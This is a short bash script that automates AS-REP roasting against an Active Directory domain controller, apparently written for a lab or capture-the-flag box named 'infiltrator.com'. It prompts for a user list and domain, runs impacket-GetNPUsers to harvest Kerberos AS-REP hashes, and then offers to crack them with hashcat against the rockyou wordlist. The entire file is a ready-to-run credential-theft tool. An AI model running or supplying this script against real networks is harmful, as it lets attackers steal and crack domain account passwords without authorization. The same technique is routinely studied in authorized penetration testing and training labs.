#!/bin/bash

# Color setup
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
RED='\033[1;31m'
NC='\033[0m'

echo -e "${CYAN}=============================================="
echo "            AS-REP Roasting Automation        "
echo -e "==============================================${NC}\n"

# Get user inputs
read -p "Enter users file path (e.g., valid.txt): " users_file
read -p "Enter output file name (e.g., ASREProastables.txt): " output_file
read -p "Enter domain controller IP (e.g., dc01.infiltrator.com): " dc_ip
read -p "Enter domain name (e.g., infiltrator.com): " domain

# Safety check: verify user inputs
if [[ -z "$users_file" || -z "$output_file" || -z "$dc_ip" || -z "$domain" ]]; then
    echo -e "${RED}Error: All fields are required. Exiting.${NC}"
    exit 1
fi

# Check if users file exists
if [[ ! -f "$users_file" ]]; then
    echo -e "${RED}Error: Users file '${users_file}' does not exist.${NC}"
    exit 1
fi

# Check if IP is reachable
echo -e "\n${YELLOW}Checking connection to Domain Controller...${NC}"
if ping -c 1 -W 2 "$dc_ip" &> /dev/null; then
    echo -e "${CYAN}Domain Controller is reachable.${NC}"
else
    echo -e "${RED}Domain Controller is NOT reachable at $dc_ip. Please check the IP and network.${NC}"
    exit 1
fi

# Ensure output file exists (create empty file if not)
if [[ ! -f "$output_file" ]]; then
    touch "$output_file"
    echo -e "${YELLOW}Output file '${output_file}' created.${NC}"
fi

# Show full command
echo -e "\n${YELLOW}This is the command that will be executed:${NC}"
echo "impacket-GetNPUsers -usersfile ${users_file} -request -format hashcat -outputfile ${output_file} -dc-ip ${dc_ip} '${domain}/'"

# Ask user to proceed
read -p "Do you want to run this command now? (y/n): " confirm

if [[ "$confirm" =~ ^[Yy]$ ]]; then
    timeout 60s impacket-GetNPUsers -usersfile "${users_file}" -request -format hashcat -outputfile "${output_file}" -dc-ip "${dc_ip}" "${domain}/"

    echo -e "\n${CYAN}Command execution completed.${NC}"

    # Strong check: Look for actual AS-REP hash pattern
    if grep -q "\$krb5asrep\$" "$output_file"; then
        echo -e "\n${YELLOW}Hashes found in ${output_file}.${NC}"
        read -p "Do you want to crack the hashes with hashcat now? (y/n): " crack_confirm

        if [[ "$crack_confirm" =~ ^[Yy]$ ]]; then
            hashcat -m 18200 -a 0 -o cracked_hashes.txt "$output_file" /usr/share/wordlists/rockyou.txt
            echo -e "\n${CYAN}Hashcat cracking finished.${NC}"
            echo -e "${YELLOW}Cracked hashes saved in cracked_hashes.txt${NC}"
        else
            echo -e "${YELLOW}Skipping hashcat cracking.${NC}"
        fi
    else
        echo -e "${YELLOW}No hashes found in ${output_file}.${NC}"
    fi
else
    echo -e "${YELLOW}Command not executed.${NC}"
fi

